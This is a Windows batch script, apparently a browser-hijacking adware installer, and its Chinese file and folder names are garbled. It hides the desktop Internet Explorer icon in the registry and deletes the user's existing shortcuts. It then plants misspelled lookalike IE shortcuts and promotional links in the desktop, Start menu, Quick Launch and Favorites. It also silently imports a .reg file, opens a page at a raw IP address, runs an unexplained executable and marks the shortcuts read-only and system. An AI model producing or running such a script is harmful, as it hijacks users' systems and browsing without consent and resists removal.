cls
@echo off
 Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Set "TMPINF=C:\TmpInf.inf"
echo [Version] >%TMPINF%
echo Signature="$Windows NT$" >>%TMPINF%
echo [DefaultInstall] >>%TMPINF%
RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
del %TMPINF%
 
del "%userprofile%\����\IEXPLORE.lnk"
del "%userprofile%\����\IEXPLOREr.lnk"
del "%userprofile%\����\Internet Exporer.lnk"
del "%userprofile%\����\Internet Explorer.lnk"
del "%userprofile%\����\Internet Exp1orer.lnk"
del "%userprofile%\����\Internet Explorer.lnk" 
del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\*Internet*.lnk"  /f/q/a

del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
del "%userprofile%\����\*.url"     /f/q/a
del   "%userprofile%\����ʼ���˵�\*.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\*.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.url" /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.lnk" /f/q/a






copy "��ѶQQ.lnk" "%userprofile%\����ʼ���˵�\����\����\QQ.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\����\Internet Expleror.lnk" /y
copy "zq.lnk" "%userprofile%\����\��׬���.lnk" /y
copy "yx.lnk" "%userprofile%\����\С��Ϸ.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\����\��ѵ�Ӱ.lnk" /y
copy "FilmTVkk.lnk" "%userprofile%\����\�����������.lnk" /y
copy "��ŮͼƬ.lnk" "%userprofile%\����\��ŮͼƬ.lnk" /y
copy "�Ա�����.lnk" "%userprofile%\����\�Ա�����.lnk" /y
copy "��������վ.lnk" "%userprofile%\����\��������վ.lnk" /y
 
 


copy "Internet Explorer.lnk" "%userprofile%\����ʼ���˵�\��ַ֮��.lnk" /y
copy "zq.lnk" "%userprofile%\����ʼ���˵�\��׬���.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\����ʼ���˵�\��ѵ�Ӱ.lnk" /y

copy "yx.lnk" "%userprofile%\����ʼ���˵�\С��Ϸ.lnk" /y
copy "��ŮͼƬ.lnk" "%userprofile%\����ʼ���˵�\��ŮͼƬ.lnk" /y


copy "Internet Explorer.lnk" "%userprofile%\����ʼ���˵�\����\Internet Exporer.lnk" /y
copy "Internet Exporer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorrer �����.lnk" /y


 copy "yx.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\С��Ϸ.lnk" /y
 copy "zq.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\��׬���.lnk" /y



copy "��ѵ�Ӱ.lnk" "%userprofile%\Favorites\��ѵ�Ӱ.lnk" /y
copy "yx.lnk" "%userprofile%\Favorites\С��Ϸ.lnk" /y
copy "Internet Exporer.lnk" "%userprofile%\Favorites\��վ��ȫ.lnk" /y 
copy "��ŮͼƬ.lnk" "%userprofile%\Favorites\��ŮͼƬ.lnk" /y



regedit /s sy.reg
 
 start http://98.126.213.98:1216/5a7932/go37.htm

  start dianying.exe

 attrib  "%USERPROFILE%\����\*.lnk"  +R +S

 attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S



exit